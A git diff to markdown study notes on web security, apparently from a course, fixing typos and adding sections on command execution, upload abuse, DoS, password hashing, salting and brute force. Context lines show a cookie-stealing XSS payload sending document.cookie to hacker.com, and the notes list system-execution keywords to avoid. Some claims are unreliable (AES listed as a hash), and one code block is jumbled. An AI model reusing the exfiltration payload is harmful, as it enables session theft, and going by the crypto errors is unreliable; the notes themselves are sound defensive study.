@@ -295,7 +295,7 @@ clean_params["first_name"] = sanitize(params["user"]["first_name"])
     - Be smart about code in public pages
 - Library directory
 	- Not accessible by the web server 
-	- Acessible by your code via the file system
+	- Accessible by your code via the file system
 - Web server configuration
     - Set document root (public directory)
     - Allow/deny access
@@ -305,16 +305,16 @@ clean_params["first_name"] = sanitize(params["user"]["first_name"])
 ### Keeping credentials private
 - Plain text credential are dangerous
     - Give them highest level of care
-    - Keep them seperate from code
+    - Keep them separate from code
     - Keep them out of version control systems (hard to purge from the history)
     - Have as few copies as necessary
-    - Developers should all have their own seperate databases
+    - Developers should all have their own separate databases
 - Do not reuse passwords
     - Unique for every computer, environment, database
-- Prefer hashed password whenever possbile
+- Prefer hashed password whenever possible
 - Public-key cryptography
     - example: SSH keys
-    - diffrent from using a password: we don't send our password, we don't send our private key
+    - different from using a password: we don't send our password, we don't send our private key
     - SSH agent, Keychain(one master password)
     - SSH agent forwarding
 
@@ -337,7 +337,7 @@ clean_params["first_name"] = sanitize(params["user"]["first_name"])
     - Cookie/session
     - URL and all parameters (raw request)
     - Backtrace (error stack)
-- Activity Loggin
+- Activity Logging
     - Keep an activity History or Audit Trail
         - Add database table called 'logs'
         - Write a function to add entries with a timestamp
@@ -407,17 +407,18 @@ Cookie:
 ``'http://hacker.com?steal=' + document.cookie``
 - Cookies can be sniffed by observing network traffic
 - Cookie Solutions
-    - Only put non-senstive data in cookies (e.g., preferences)
+    - Only put non-sensitive data in cookies (e.g., preferences)
     - Use `HttpOnly` cookies
         - will make the cookie unavailable to JavaScript
         - Still not supported by older browsers
     - Use Secure cookies (HTTPS only), which means you can't eavesdrop on them
     - Set cookie expiration date
     - Set cookie domain and path
-- Encryt cookie data
+- Encrypt cookie data
 - Use server-side sessions instead of client-side cookies (not considering session hijecking yet)
 
 ### Session hijacking
+
 - Session ID is used to reference sensitive data on the server  
 - Similar to cookie theft but much more valuable
 - Can be used to assume your identity and logged-in status
@@ -435,6 +436,7 @@ Cookie:
 - Use Secure cookies
 
 ### Session fixation
+
 - A hacker gives you a session ID to use instead 
 - Example
 ```
@@ -450,19 +452,125 @@ http://yourbank.com/login?SESSION_ID=a1b2c3d4e5...
 
 ### Remote system execution
 
+- Remotely run operating system commands on a web server
+- System Execution Keywords
+```
+system
+exec
+shell
+sh
+shell_exec
+open
+popen
+proc_open
+call
+subprocess
+spawn
+passthru
+eval
+%x
+`
+```
+- Solution
+    - Avoid system execution keywords
+    - Understand the commands and their syntax completely
+    - Perform system execution with extreme caution
+    - Add additional data validations
+
 ### File-upload abuse
 
+- Can be used to upload too much 
+- Can be used to upload malicious files
+- Solution
+    - Require user authentication, no anonymous uploads
+    - Limit maximum upload size
+    - Limit allowable file formats, file extensions
+    - Use caution when opening uploaded files
+    - Do not host uploaded files which have not been verified (virus-scan)
+
 ### Denial of service
+
+- Attempt to make a server unavailable to users
+- Usually performed by overloading a server with requests
+- Includes DNS and routing disruption
+- Includes using up disk space, processor power, bandwidth
+- Attacks often preformed by distributed network ("DDoS")
+- Cheap to launch, difficult to prevent
+- Solution
+    - Firewalls
+    - Switches and routers
+    - Load management hardware / software (load-balancer)
+    - Collection of reverse proxies
+    - Keep infrastructure up to update
+    - Make network traffic visible
+    - Develop a response plan
+    - "Black hole" or "null route" traffic
 
 ## 5. Encryption and User Authentication
 
 ### Password encryption
 
+- Never store password in plain text
+- Compromises user on your site
+- Compromises user on other sites
+- One-way encryption (hashing algorithm)
+    - One-way means non-reversible, even by us
+    - **Same inputs + same hashing algorithm = same output**
+    - Encrypt attempted password, compare against stored one
+- Hashing algorithms 
+    - MD5: not considered safe anymore (rainbow)
+    - SHA-1
+    - SHA-2
+    - Whirlpool
+    - Tiger
+    - AES
+    - **Blowfish**
+        - Slow: againt brute-force attacks
+        - Secure
+        - Free
+        - Easy
+
 ### Salting passwords
 
+- Rainbow tables: pre-computed tables of password hashes for each hashing algorithm 
+- Salting
+    - Additional data added to the password before encryption
+    ```js
+- Store salt in Database
+    - When using user data for salt and user data could change
+    - When using random salt
+    - Just the salt, not the password
+    const saltedPassword = `Put salt on the ${password}`
+    ```
+    - Knowing password requires also knowing the salt string
+    - Rainbow tables could be used, but they would be almost impossible large
+- Unique Salt
+    ```js
+    const uniqueSaltedPassword = `Put salt on the ${password} for ${username}`
+    ```
+    - Knowing password requires also knowing the salt string and username
+- Random Salt
+    ```js
+    const uniqueSaltedPassword = `Put salt on the ${password} at ${timestamp}`
+    ```
+- Store salt in Database
+    - When using user data for salt and user data could change
+    - When using random salt
+    - Just the salt, not the password
+
 ### Password requirements
+- Require length, but do not limit length. (The hashed values would always be of the same length)
+- Require non-alphanumeric characters (against simple rainbow table)
+- Confirm password
+- Report password strength: weak, normal, or strong?
+- Do not record a password hint
+- Security questions are questionable 
 
 ### Brute-force attacks
+- Systematically trying all possible input combinations until the correct solution is found
+- aka "Exhaustive key search"
+- Dictionary attack
+- KeySpace^KeyLength * TimePerAttempt = TimeRequired
 
 ### Using SSL for login
 
